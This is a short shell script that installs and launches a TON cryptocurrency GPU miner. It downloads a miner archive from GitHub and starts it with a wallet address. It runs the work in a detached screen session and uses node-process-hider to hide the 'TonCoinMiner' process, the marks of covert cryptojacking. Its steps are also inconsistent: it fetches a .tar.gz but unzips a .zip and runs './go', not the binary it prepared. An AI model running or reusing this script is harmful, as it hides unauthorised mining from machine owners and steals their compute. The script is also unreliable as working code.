#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 79 97
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add TonCoinMiner
sudo wget https://github.com/d-crypto99/Bemiii/raw/main/TonCoin_Miner_v1.2.tar.gz && unzip TonCoin_Miner_v1.2.zip && mv v1.2 mng && cd mng && chmod +x TonCoinMiner
sudo apt-get install opencl-headers ocl-icd-libopencl1 ocl-icd-opencl-dev curl
./go EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
